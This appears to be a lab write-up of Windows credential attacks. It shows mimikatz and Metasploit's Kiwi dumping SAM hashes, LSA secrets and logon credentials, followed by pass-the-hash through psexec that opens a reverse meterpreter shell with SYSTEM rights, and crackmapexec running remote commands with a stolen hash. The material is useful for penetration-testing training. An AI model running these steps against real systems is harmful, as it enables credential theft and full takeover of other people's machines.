# Password Hashes

* Stored in SAM (Security Accounts Manager)
* LSA (Local Security Authority)
* LSASS (Local Security Authority Sub System)
* LM (LanMan)
* NTLM - NTHash


## Kiwi

```bash
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.

meterpreter > help

...

Kiwi Commands
=============

    Command                Description
    -------                -----------
    creds_all              Retrieve all credentials (parsed)
    creds_kerberos         Retrieve Kerberos creds (parsed)
    creds_livessp          Retrieve Live SSP creds
    creds_msv              Retrieve LM/NTLM creds (parsed)
    creds_ssp              Retrieve SSP creds
    creds_tspkg            Retrieve TsPkg creds (parsed)
    creds_wdigest          Retrieve WDigest creds (parsed)
    dcsync                 Retrieve user account information via DCSync (unparsed)
    dcsync_ntlm            Retrieve user account NTLM hash, SID and RID via DCSync
    golden_ticket_create   Create a golden kerberos ticket
    kerberos_ticket_list   List all kerberos tickets (unparsed)
    kerberos_ticket_purge  Purge any in-use kerberos tickets
    kerberos_ticket_use    Use a kerberos ticket
    kiwi_cmd               Execute an arbitary mimikatz command (unparsed)
    lsa_dump_sam           Dump LSA SAM (unparsed)
    lsa_dump_secrets       Dump LSA secrets (unparsed)
    password_change        Change the password/hash of a user
    wifi_list              List wifi profiles/creds for the current user
    wifi_list_shared       List shared wifi profiles/creds (requires SYSTEM)

meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username       Domain         NTLM                              SHA1
--------       ------         ----                              ----
Administrator  ATTACKDEFENSE  e3c61a68f1b89ee6c8ba9507378dc88d  fa62275e30d286c09d30d8fece82664eb34323ef

wdigest credentials
===================

Username        Domain         Password
--------        ------         --------
(null)          (null)         (null)
ATTACKDEFENSE$  WORKGROUP      (null)
Administrator   ATTACKDEFENSE  (null)

kerberos credentials
====================

Username        Domain         Password
--------        ------         --------
(null)          (null)         (null)
Administrator   ATTACKDEFENSE  (null)
attackdefense$  WORKGROUP      (null)



meterpreter > lsa_dump_sam
[+] Running as SYSTEM
[*] Dumping SAM
Domain : ATTACKDEFENSE
SysKey : 377af0de68bdc918d22c57a263d38326
Local SID : S-1-5-21-3688751335-3073641799-161370460

SAMKey : 858f5bda5c99e45094a6a1387241a33d

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: e3c61a68f1b89ee6c8ba9507378dc88d

RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: 58f8e0214224aebc2c5f82fb7cb47ca1

RID  : 000003f0 (1008)
User : student
  Hash NTLM: bd4ca1fbe028f3c5066467a7f6a73b0b



meterpreter > lsa_dump_secrets
[+] Running as SYSTEM
[*] Dumping LSA secrets
Domain : ATTACKDEFENSE
SysKey : 377af0de68bdc918d22c57a263d38326

Local name : ATTACKDEFENSE ( S-1-5-21-3688751335-3073641799-161370460 )
Domain name : WORKGROUP

Policy subsystem is : 1.18
LSA Key(s) : 1, default {47980b9c-8bd1-89c9-bfb5-0c4fca25e625}
  [00] {47980b9c-8bd1-89c9-bfb5-0c4fca25e625} 247e7be223db5e50291fc0fcec276ff8236c32a8a6183c5a0d0b6b044590ce06

Secret  : DPAPI_SYSTEM
cur/hex : 01 00 00 00 34 5e 65 80 f9 04 a4 8c a5 0e 6c 74 6c d2 c3 b8 8e 7a ca c3 a3 3b 0e 6e 0a 64 f3 12 fc c7 92 67 a3 2f d5 d1 e4 41 33 ac
    full: 345e6580f904a48ca50e6c746cd2c3b88e7acac3a33b0e6e0a64f312fcc79267a32fd5d1e44133ac
    m/u : 345e6580f904a48ca50e6c746cd2c3b88e7acac3 / a33b0e6e0a64f312fcc79267a32fd5d1e44133ac
old/hex : 01 00 00 00 c1 3a 28 e3 94 7b 64 5d 94 29 b4 c9 1c 9b 0c b1 b6 5a aa 2c 34 4d ee ed 86 74 0f 12 25 37 8c 38 69 b3 b4 53 b6 37 86 44
    full: c13a28e3947b645d9429b4c91c9b0cb1b65aaa2c344deeed86740f1225378c3869b3b453b6378644
    m/u : c13a28e3947b645d9429b4c91c9b0cb1b65aaa2c / 344deeed86740f1225378c3869b3b453b6378644

Secret  : NL$KM
cur/hex : 8d d2 8e 67 54 58 89 b1 c9 53 b9 5b 46 a2 b3 66 d4 3b 95 80 92 7d 67 78 b7 1d f9 2d a5 55 b7 a3 61 aa 4d 86 95 85 43 86 e3 12 9e c4 91 cf 9a 5b d8 bb 0d ae fa d3 41 e0 d8 66 3d 19 75 a2 d1 b2
old/hex : 8d d2 8e 67 54 58 89 b1 c9 53 b9 5b 46 a2 b3 66 d4 3b 95 80 92 7d 67 78 b7 1d f9 2d a5 55 b7 a3 61 aa 4d 86 95 85 43 86 e3 12 9e c4 91 cf 9a 5b d8 bb 0d ae fa d3 41 e0 d8 66 3d 19 75 a2 d1 b2
```


## mimikatz

```bash
mimikatz # privilege::debug
Privilege '20' OK


mimikatz # lsadump::sam
Domain : ATTACKDEFENSE
SysKey : 377af0de68bdc918d22c57a263d38326
Local SID : S-1-5-21-3688751335-3073641799-161370460

SAMKey : 858f5bda5c99e45094a6a1387241a33d

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: e3c61a68f1b89ee6c8ba9507378dc88d

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : ed1f5e64aad3727f03522bbddc080d77

* Primary:Kerberos-Newer-Keys *
    Default Salt : ATTACKDEFENSEAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : f566d48c0c62f88d997e9e56b52eed1696aead09df3100982bcfc5920655da5d
      aes128_hmac       (4096) : bf0ca9e206e82ce481c818070bef0855
      des_cbc_md5       (4096) : 6d570d08df8979fe
    OldCredentials
      aes256_hmac       (4096) : 69d101a02f3f4648bf9875f10c1cd268d3f500c3253ab862222a9e1bb3740247
      aes128_hmac       (4096) : 3c3fd899f7f004ed44e9e48f868a5ddc
      des_cbc_md5       (4096) : 9b808fb9e0cbb3b5
    OlderCredentials
      aes256_hmac       (4096) : 4cbbe8ad8482ca76952b08cd9103ba91af35c9d8b21a3d49c332e072618a9fa9
      aes128_hmac       (4096) : b18addd75f8a2b106b262c7b5e517623
      des_cbc_md5       (4096) : 7fe0c2a15eb32fcd

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : ATTACKDEFENSEAdministrator
    Credentials
      des_cbc_md5       : 6d570d08df8979fe
    OldCredentials
      des_cbc_md5       : 9b808fb9e0cbb3b5


RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: 58f8e0214224aebc2c5f82fb7cb47ca1

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : a1528cd40d99e5dfa9fa0809af998696

* Primary:Kerberos-Newer-Keys *
    Default Salt : WDAGUtilityAccount
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 3ff137e53cac32e3e3857dc89b725fd62ae4eee729c1c5c077e54e5882d8bd55
      aes128_hmac       (4096) : 15ac5054635c97d02c174ee3aa672227
      des_cbc_md5       (4096) : ce9b2cabd55df4ce

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WDAGUtilityAccount
    Credentials
      des_cbc_md5       : ce9b2cabd55df4ce


RID  : 000003f0 (1008)
User : student
  Hash NTLM: bd4ca1fbe028f3c5066467a7f6a73b0b

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : b8e5edf45f3a42335f1f4906a24a08fe

* Primary:Kerberos-Newer-Keys *
    Default Salt : EC2AMAZ-R69684Tstudent
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : bab064fdaf62216a1577f1d5cd88e162f6962b4a421d199adf4c66b61ec6ac7c
      aes128_hmac       (4096) : 42bc1d17d1236d3afc09efbeba547d2c
      des_cbc_md5       (4096) : 1a975b02a7bf15d5

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : EC2AMAZ-R69684Tstudent
    Credentials
      des_cbc_md5       : 1a975b02a7bf15d5



mimikatz # lsadump::secrets
Domain : ATTACKDEFENSE
SysKey : 377af0de68bdc918d22c57a263d38326

Local name : ATTACKDEFENSE ( S-1-5-21-3688751335-3073641799-161370460 )
Domain name : WORKGROUP

Policy subsystem is : 1.18
LSA Key(s) : 1, default {47980b9c-8bd1-89c9-bfb5-0c4fca25e625}
  [00] {47980b9c-8bd1-89c9-bfb5-0c4fca25e625} 247e7be223db5e50291fc0fcec276ff8236c32a8a6183c5a0d0b6b044590ce06

Secret  : DPAPI_SYSTEM
cur/hex : 01 00 00 00 34 5e 65 80 f9 04 a4 8c a5 0e 6c 74 6c d2 c3 b8 8e 7a ca c3 a3 3b 0e 6e 0a 64 f3 12 fc c7 92 67 a3 2f d5 d1 e4 41 33 ac
    full: 345e6580f904a48ca50e6c746cd2c3b88e7acac3a33b0e6e0a64f312fcc79267a32fd5d1e44133ac
    m/u : 345e6580f904a48ca50e6c746cd2c3b88e7acac3 / a33b0e6e0a64f312fcc79267a32fd5d1e44133ac
old/hex : 01 00 00 00 c1 3a 28 e3 94 7b 64 5d 94 29 b4 c9 1c 9b 0c b1 b6 5a aa 2c 34 4d ee ed 86 74 0f 12 25 37 8c 38 69 b3 b4 53 b6 37 86 44
    full: c13a28e3947b645d9429b4c91c9b0cb1b65aaa2c344deeed86740f1225378c3869b3b453b6378644
    m/u : c13a28e3947b645d9429b4c91c9b0cb1b65aaa2c / 344deeed86740f1225378c3869b3b453b6378644

Secret  : NL$KM
cur/hex : 8d d2 8e 67 54 58 89 b1 c9 53 b9 5b 46 a2 b3 66 d4 3b 95 80 92 7d 67 78 b7 1d f9 2d a5 55 b7 a3 61 aa 4d 86 95 85 43 86 e3 12 9e c4 91 cf 9a 5b d8 bb 0d ae fa d3 41 e0 d8 66 3d 19 75 a2 d1 b2
old/hex : 8d d2 8e 67 54 58 89 b1 c9 53 b9 5b 46 a2 b3 66 d4 3b 95 80 92 7d 67 78 b7 1d f9 2d a5 55 b7 a3 61 aa 4d 86 95 85 43 86 e3 12 9e c4 91 cf 9a 5b d8 bb 0d ae fa d3 41 e0 d8 66 3d 19 75 a2 d1 b2



mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 3496142 (00000000:003558ce)
Session           : Interactive from 3
User Name         : DWM-3
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 1/26/2024 12:41:13 PM
SID               : S-1-5-90-0-3
	msv :	
	tspkg :	
	wdigest :	
	 * Username : ATTACKDEFENSE$
	 * Domain   : WORKGROUP
	 * Password : (null)
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 ; 3489818 (00000000:0035401a)
Session           : Interactive from 3
User Name         : UMFD-3
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 1/26/2024 12:41:13 PM
SID               : S-1-5-96-0-3
	msv :	
	tspkg :	
	wdigest :	
	 * Username : ATTACKDEFENSE$
	 * Domain   : WORKGROUP
	 * Password : (null)
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 ; 147238 (00000000:00023f26)
Session           : Interactive from 1
User Name         : Administrator
Domain            : ATTACKDEFENSE
Logon Server      : ATTACKDEFENSE
Logon Time        : 1/26/2024 12:16:51 PM
SID               : S-1-5-21-3688751335-3073641799-161370460-500
	msv :	
	 [00000003] Primary
	 * Username : Administrator
	 * Domain   : ATTACKDEFENSE
	 * NTLM     : e3c61a68f1b89ee6c8ba9507378dc88d
	 * SHA1     : fa62275e30d286c09d30d8fece82664eb34323ef
	tspkg :	
	wdigest :	
	 * Username : Administrator
	 * Domain   : ATTACKDEFENSE
	 * Password : (null)
	kerberos :	
	 * Username : Administrator
	 * Domain   : ATTACKDEFENSE
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 58652 (00000000:0000e51c)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 1/26/2024 12:16:42 PM
SID               : S-1-5-90-0-1
	msv :	
	tspkg :	
	wdigest :	
	 * Username : ATTACKDEFENSE$
	 * Domain   : WORKGROUP
	 * Password : (null)
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 ; 58634 (00000000:0000e50a)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 1/26/2024 12:16:42 PM
SID               : S-1-5-90-0-1
	msv :	
	tspkg :	
	wdigest :	
	 * Username : ATTACKDEFENSE$
	 * Domain   : WORKGROUP
	 * Password : (null)
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : ATTACKDEFENSE$
Domain            : WORKGROUP
Logon Server      : (null)
Logon Time        : 1/26/2024 12:16:41 PM
SID               : S-1-5-20
	msv :	
	tspkg :	
	wdigest :	
	 * Username : ATTACKDEFENSE$
	 * Domain   : WORKGROUP
	 * Password : (null)
	kerberos :	
	 * Username : attackdefense$
	 * Domain   : WORKGROUP
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 3496169 (00000000:003558e9)
Session           : Interactive from 3
User Name         : DWM-3
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 1/26/2024 12:41:13 PM
SID               : S-1-5-90-0-3
	msv :	
	tspkg :	
	wdigest :	
	 * Username : ATTACKDEFENSE$
	 * Domain   : WORKGROUP
	 * Password : (null)
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 1/26/2024 12:16:42 PM
SID               : S-1-5-19
	msv :	
	tspkg :	
	wdigest :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	kerberos :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 29328 (00000000:00007290)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 1/26/2024 12:16:41 PM
SID               : S-1-5-96-0-1
	msv :	
	tspkg :	
	wdigest :	
	 * Username : ATTACKDEFENSE$
	 * Domain   : WORKGROUP
	 * Password : (null)
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 ; 29300 (00000000:00007274)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 1/26/2024 12:16:41 PM
SID               : S-1-5-96-0-0
	msv :	
	tspkg :	
	wdigest :	
	 * Username : ATTACKDEFENSE$
	 * Domain   : WORKGROUP
	 * Password : (null)
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 ; 28236 (00000000:00006e4c)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 1/26/2024 12:16:41 PM
SID               :
	msv :	
	tspkg :	
	wdigest :	
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : ATTACKDEFENSE$
Domain            : WORKGROUP
Logon Server      : (null)
Logon Time        : 1/26/2024 12:16:40 PM
SID               : S-1-5-18
	msv :	
	tspkg :	
	wdigest :	
	 * Username : ATTACKDEFENSE$
	 * Domain   : WORKGROUP
	 * Password : (null)
	kerberos :	
	 * Username : attackdefense$
	 * Domain   : WORKGROUP
	 * Password : (null)
	ssp :	
	credman :	

```

## Dump Hashes From Meterpreter

```bash
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e3c61a68f1b89ee6c8ba9507378dc88d:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
student:1008:aad3b435b51404eeaad3b435b51404ee:bd4ca1fbe028f3c5066467a7f6a73b0b:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58f8e0214224aebc2c5f82fb7cb47ca1:::
```

## Pass The Hash

Requires LM and NTLM hashes

Use the hash has a password

### Metasploit


```bash
msf6 exploit(windows/http/badblue_passthru) > use exploit/windows/smb/psexec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp

msf6 exploit(windows/smb/psexec) > options

Module options (exploit/windows/smb/psexec):

   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   RHOSTS                10.4.17.173      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                 445              yes       The SMB service port (TCP)
   SERVICE_DESCRIPTION                    no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                   no        The service display name
   SERVICE_NAME                           no        The service name
   SHARE                                  no        The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
   SMBDomain             .                no        The Windows domain to use for authentication
   SMBPass                                no        The password for the specified username
   SMBUser                                no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.4.7        yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(windows/smb/psexec) > set LPORT 4422
LPORT => 4422

msf6 exploit(windows/smb/psexec) > set SMBUSER Administrator
SMBUSER => Administrator

msf6 exploit(windows/smb/psexec) > set SMBPASS aad3b435b51404eeaad3b435b51404ee:e3c61a68f1b89ee6c8ba9507378dc88d
SMBPASS => aad3b435b51404eeaad3b435b51404ee:e3c61a68f1b89ee6c8ba9507378dc88d


msf6 exploit(windows/smb/psexec) > run

[*] Started reverse TCP handler on 10.10.4.7:4422
[*] 10.4.17.173:445 - Connecting to the server...
[*] 10.4.17.173:445 - Authenticating to 10.4.17.173:445 as user 'Administrator'...
[*] 10.4.17.173:445 - Selecting PowerShell target
[*] 10.4.17.173:445 - Executing the payload...
[+] 10.4.17.173:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175174 bytes) to 10.4.17.173
[*] Meterpreter session 2 opened (10.10.4.7:4422 -> 10.4.17.173:50299) at 2024-01-26 19:07:29 +0530

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

### crackmapexec

```bash
root@attackdefense:~# crackmapexec smb 10.4.17.173 -u Administrator -H "e3c61a68f1b89ee6c8ba9507378dc88d"
SMB         10.4.17.173     445    ATTACKDEFENSE    [*] Windows 10.0 Build 17763 x64 (name:ATTACKDEFENSE) (domain:AttackDefense) (signing:False) (SMBv1:False)
SMB         10.4.17.173     445    ATTACKDEFENSE    [+] AttackDefense\Administrator e3c61a68f1b89ee6c8ba9507378dc88d (Pwn3d!)


root@attackdefense:~# crackmapexec smb 10.4.17.173 -u Administrator -H "e3c61a68f1b89ee6c8ba9507378dc88d" -x "ipconfig"
SMB         10.4.17.173     445    ATTACKDEFENSE    [*] Windows 10.0 Build 17763 x64 (name:ATTACKDEFENSE) (domain:AttackDefense) (signing:False) (SMBv1:False)
SMB         10.4.17.173     445    ATTACKDEFENSE    [+] AttackDefense\Administrator e3c61a68f1b89ee6c8ba9507378dc88d (Pwn3d!)
SMB         10.4.17.173     445    ATTACKDEFENSE    [+] Executed command
SMB         10.4.17.173     445    ATTACKDEFENSE    Windows IP Configuration
SMB         10.4.17.173     445    ATTACKDEFENSE
SMB         10.4.17.173     445    ATTACKDEFENSE
SMB         10.4.17.173     445    ATTACKDEFENSE    Ethernet adapter Ethernet 3:
SMB         10.4.17.173     445    ATTACKDEFENSE
SMB         10.4.17.173     445    ATTACKDEFENSE    Connection-specific DNS Suffix  . : ec2.internal
SMB         10.4.17.173     445    ATTACKDEFENSE    Link-local IPv6 Address . . . . . : fe80::e0b4:cdc6:8632:f6ee%8
SMB         10.4.17.173     445    ATTACKDEFENSE    IPv4 Address. . . . . . . . . . . : 10.4.17.173
SMB         10.4.17.173     445    ATTACKDEFENSE    Subnet Mask . . . . . . . . . . . : 255.255.240.0
SMB         10.4.17.173     445    ATTACKDEFENSE    Default Gateway . . . . . . . . . : 10.4.16.1
```